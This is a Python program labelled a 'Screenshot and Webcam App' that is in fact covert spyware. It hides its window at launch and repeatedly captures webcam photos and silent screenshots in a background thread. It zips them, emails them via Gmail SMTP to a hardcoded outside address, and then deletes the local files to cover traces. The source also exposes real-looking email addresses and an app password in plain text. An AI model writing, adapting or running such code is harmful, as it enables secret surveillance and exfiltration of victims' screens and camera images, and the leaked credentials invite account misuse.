import cv2
import tkinter as tk
import time
from PIL import Image, ImageTk
from datetime import datetime
import os
import threading
import subprocess
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
import zipfile
import shutil
import traceback
import platform
import tempfile

class WebcamApp:
    def __init__(self, root):
        self.root = root
        self.root.withdraw()  # Hide the window initially
        self.root.title("Screenshot and Webcam App")

        self.capture_duration = 60  # Duration of capture in seconds
        self.capture_delay = 5  # Delay between captures in seconds
        self.capture_folder = None
        self.zip_filename = None

        self.video_capture = cv2.VideoCapture(0)

        self.canvas = tk.Canvas(root, width=self.video_capture.get(cv2.CAP_PROP_FRAME_WIDTH),
                                height=self.video_capture.get(cv2.CAP_PROP_FRAME_HEIGHT))
        self.canvas.pack()

        self.update_frame()

        self.capture_thread = threading.Thread(target=self.capture_loop)
        self.capture_thread.start()

        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)

        # Initialize dynamic PID management
        self.dynamic_pid_timer = threading.Timer(2.0, self.update_pid)
        self.dynamic_pid_timer.start()
        self.current_pid = os.getpid()

    def update_frame(self):
        ret, frame = self.video_capture.read()
        if ret:
            self.photo = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            self.photo = Image.fromarray(self.photo)
            self.photo = ImageTk.PhotoImage(self.photo)
            self.canvas.create_image(0, 0, image=self.photo, anchor=tk.NW)
        self.root.after(10, self.update_frame)

    def capture_loop(self):
        while True:
            try:
                self.capture_folder = self.create_capture_folder()

                for _ in range(self.capture_duration // self.capture_delay):
                    self.capture_webcam_photo()
                    self.capture_screenshot()
                    threading.Thread(target=self.delayed_capture).start()
                    time.sleep(self.capture_delay)

                self.zip_and_send_email()

            except Exception as e:
                traceback.print_exc()

    def create_capture_folder(self):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        folder_name = os.path.join(tempfile.gettempdir(), f"attachments_{timestamp}")
        os.makedirs(folder_name, exist_ok=True)
        return folder_name

    def capture_webcam_photo(self):
        ret, frame = self.video_capture.read()
        if ret:
            webcam_photo_filename = os.path.join(self.capture_folder, f"photo_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
            cv2.imwrite(webcam_photo_filename, frame)

    def capture_screenshot(self):
        screenshot_filename = os.path.join(self.capture_folder, f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
        if platform.system() == 'Windows':
            self.capture_screenshot_windows(screenshot_filename)
        elif platform.system() == 'Darwin':  # macOS
            self.capture_screenshot_macos(screenshot_filename)
        elif platform.system() == 'Linux':
            self.capture_screenshot_linux(screenshot_filename)

    def capture_screenshot_windows(self, filename):
        try:
            import pyautogui
            screenshot = pyautogui.screenshot()
            screenshot.save(filename)
        except ImportError:
            print("pyautogui module not found. Please install it to capture screenshots on Windows.")
            traceback.print_exc()

    def capture_screenshot_macos(self, filename):
        try:
            subprocess.run(['screencapture', '-x', filename])
        except FileNotFoundError:
            print("screencapture command not found. Make sure you are running on macOS.")
            traceback.print_exc()

    def capture_screenshot_linux(self, filename):
        try:
            subprocess.run(['gnome-screenshot', '-f', filename])
        except FileNotFoundError:
            print("gnome-screenshot command not found. Make sure you are running on a Linux system with GNOME desktop.")
            traceback.print_exc()

    def delayed_capture(self):
        time.sleep(1)  # Ensure the screenshot capture thread is finished

    def zip_and_send_email(self):
        try:
            self.zip_filename = os.path.join(tempfile.gettempdir(), f"{os.path.basename(self.capture_folder)}.zip")
            with zipfile.ZipFile(self.zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, _, files in os.walk(self.capture_folder):
                    for file in files:
                        zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), self.capture_folder))

            self.send_email()
            self.delete_files()

        except Exception as e:
            traceback.print_exc()

    def send_email(self):
        try:
            sender_name = "Anonymous14"
            sender_email = "muthikedaniel59@gmail.com"  # Update with your email
            recipient_email = "daniel.kinyua@tutamail.com"  # Update with recipient email

            subject = f"Screenshot and Webcam photos captured at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            body = "Please find the attached zip file containing the screenshots and webcam photos."

            message = MIMEMultipart()
            message['From'] = f'{sender_name} <{sender_email}>'
            message['To'] = recipient_email
            message['Subject'] = subject
            message.attach(MIMEText(body, 'plain'))

            with open(self.zip_filename, 'rb') as attachment:
                part = MIMEBase('application', 'zip')
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f'attachment; filename= {os.path.basename(self.zip_filename)}')
                message.attach(part)

            with smtplib.SMTP('smtp.gmail.com', 587) as server:
                server.starttls()
                server.login(sender_email, "pjnf xrhf myqw gmha")  # Update with your email password
                server.sendmail(sender_email, recipient_email, message.as_string())

            self.delete_files()

        except Exception as e:
            traceback.print_exc()

    def delete_files(self):
        try:
            if self.zip_filename and os.path.exists(self.zip_filename):
                os.remove(self.zip_filename)

            if self.capture_folder and os.path.exists(self.capture_folder):
                shutil.rmtree(self.capture_folder)

        except Exception as e:
            traceback.print_exc()

    def update_pid(self):
        try:
            self.current_pid = os.getpid()
            self.dynamic_pid_timer = threading.Timer(2.0, self.update_pid)
            self.dynamic_pid_timer.start()

        except Exception as e:
            traceback.print_exc()

    def on_closing(self):
        if self.video_capture.isOpened():
            self.video_capture.release()
        if self.root.winfo_exists():
            self.root.destroy()


def run_webcam_app():
    root = tk.Tk()
    app = WebcamApp(root)
    root.mainloop()


if __name__ == "__main__":
    run_webcam_app()
